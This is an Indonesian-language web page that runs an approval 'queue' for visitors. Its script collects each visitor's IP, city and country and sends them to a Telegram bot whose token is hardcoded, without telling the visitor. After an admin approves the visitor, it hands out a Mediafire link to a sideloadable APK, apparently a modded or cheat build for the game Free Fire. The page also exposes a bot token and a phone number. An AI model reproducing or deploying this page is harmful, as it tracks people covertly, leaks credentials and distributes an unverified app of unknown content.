<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>ANTRIAN IP</title>
    <style>
        body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace;margin:0;padding:20px}
        .box{background:#111;border-radius:20px;padding:30px;width:100%;max-width:450px;border:1px solid #0f0;text-align:center}
        h1{color:#0f0;font-size:24px}
        .nomor{font-size:64px;color:#ff0;margin:15px 0}
        .ip{color:#0f0;font-size:12px}
        .status{padding:10px;border-radius:10px;margin:15px 0;background:#1a1a1a}
        .btn{display:block;padding:15px;background:orange;color:#000;border-radius:50px;text-decoration:none;font-weight:bold;margin-top:10px}
        .btn.disabled{background:#333;cursor:not-allowed}
        .red{color:#f00}
        .blocked{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999}
        .blocked h1{color:#f00;font-size:32px}
    </style>
</head>
<body id="body">
<div id="content">
    <div class="box">
        <h1>🔢 ANTRIAN</h1>
        <div class="nomor" id="nomor">---</div>
        <div class="ip" id="ip">Mengambil IP...</div>
        <div class="status" id="status">⏳ Proses...</div>
        <div id="linkArea"></div>
        <div class="ip" style="margin-top:15px">📞 ADMIN: 6285979752581</div>
    </div>
</div>

<script>
    const BOT_TOKEN='8507983517:AAGNIWh0F4DgQyqchgRrlEIoraZXm-0tGnI';
    const CHAT_ID='7743148767';
    const LINK='https://www.mediafire.com/file/51ioe7j25v0tl19/ZHXTEAMV92.apks/file';
    const ADMIN='6285979752581';
    
    let blocked=JSON.parse(localStorage.getItem('blocked_ips')||'[]');
    let user={ip:null,nomor:null,status:'pending'};
    let lastId=0;
    
    async function getIP(){
        try{let r=await fetch('https://api.ipify.org?format=json');let d=await r.json();return d.ip;}catch(e){return 'Unknown';}
    }
    function hashIP(ip){
        let h=0;for(let i=0;i<ip.length;i++){h=((h<<5)-h)+ip.charCodeAt(i);h|=0;}
        return Math.abs(h%999)+1;
    }
    async function sendTelegram(msg){
        try{await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'HTML'})});}catch(e){}
    }
    function updateUI(){
        document.getElementById('nomor').innerHTML=user.nomor||'---';
        document.getElementById('ip').innerHTML=`🌐 ${user.ip||'...'}`;
        let sDiv=document.getElementById('status');
        let linkDiv=document.getElementById('linkArea');
        if(user.status=='pending'){
            sDiv.innerHTML='⏳ MENUNGGU PERSETUJUAN ADMIN';
            linkDiv.innerHTML='<div class="btn disabled">🔒 LINK AKTIF SETELAH DISETUJUI</div>';
        }else if(user.status=='approved'){
            sDiv.innerHTML='✅ DISETUJUI!';
            linkDiv.innerHTML=`<a href="${LINK}" target="_blank" class="btn">📥 BUKA LINK</a><button onclick="bukaEpep()" class="btn" style="background:#f44336">🔥 EPEP 🔥</button>`;
        }else if(user.status=='rejected'){
            sDiv.innerHTML='❌ DITOLAK ADMIN';
            linkDiv.innerHTML='<div class="btn disabled">🚫 HAS BEEN REJECTED</div>';
        }
    }
    async function cekBot(){
        if(user.status!='pending')return;
        try{
            let r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastId+1}&timeout=2`);
            let d=await r.json();
            if(d.ok&&d.result.length){
                for(let up of d.result){
                    lastId=up.update_id;
                    let txt=up.message?.text?.toLowerCase()||'';
                    let cid=up.message?.chat?.id?.toString();
                    if(cid===CHAT_ID){
                        if(txt.includes(`approve_${user.nomor}`)||txt.includes(`approve ${user.nomor}`)){
                            user.status='approved';
                            localStorage.setItem(`approved_${user.ip}`,'true');
                            updateUI();
                            sendTelegram(`✅ IP ${user.ip} #${user.nomor} DISETUJUI`);
                        }
                        else if(txt.includes(`reject_${user.nomor}`)||txt.includes(`reject ${user.nomor}`)){
                            user.status='rejected';
                            updateUI();
                            sendTelegram(`❌ IP ${user.ip} #${user.nomor} DITOLAK`);
                        }
                        else if(txt.includes(`block_${user.nomor}`)||txt.includes(`block ${user.nomor}`)){
                            if(!blocked.includes(user.ip))blocked.push(user.ip);
                            localStorage.setItem('blocked_ips',JSON.stringify(blocked));
                            user.status='blocked';
                            document.body.innerHTML=`<div class="blocked"><h1>🚫 YOUR IP HAS BEEN BLOCKED 🚫</h1><p style="color:#f66">Akses ditolak permanen</p><p>Contact: ${ADMIN}</p></div>`;
                        }
                    }
                }
            }
        }catch(e){}
    }
    window.bukaEpep=function(){if(user.status=='approved'){window.open(LINK,'_blank');sendTelegram(`📥 IP ${user.ip} #${user.nomor} BUKA LINK`);}};
    (async function(){
        let ip=await getIP();
        if(blocked.includes(ip)){
            document.body.innerHTML=`<div class="blocked"><h1>🚫 YOUR IP HAS BEEN BLOCKED 🚫</h1><p style="color:#f66">Akses ditolak permanen</p><p>Contact: ${ADMIN}</p></div>`;
            return;
        }
        let nomor=hashIP(ip);
        let saved=localStorage.getItem(`approved_${ip}`);
        if(saved==='true'){
            user={ip,nomor,status:'approved'};
            updateUI();
            sendTelegram(`🔄 IP ${ip} #${nomor} AKSES ULANG (sudah approve)`);
        }else{
            user={ip,nomor,status:'pending'};
            updateUI();
            let info={kota:'-',negara:'-'};
            try{let r=await fetch(`https://ipapi.co/${ip}/json/`);let d=await r.json();info={kota:d.city||'-',negara:d.country_name||'-'};}catch(e){}
            sendTelegram(`🔢 ANTRIAN BARU\n#${nomor}\nIP: ${ip}\nKota: ${info.kota}\nNegara: ${info.negara}\nWaktu: ${new Date().toLocaleString()}\n\nBalas: /approve_${nomor} /reject_${nomor} /block_${nomor}`);
        }
        setInterval(cekBot,3000);
    })();
</script>
</body>
</html>
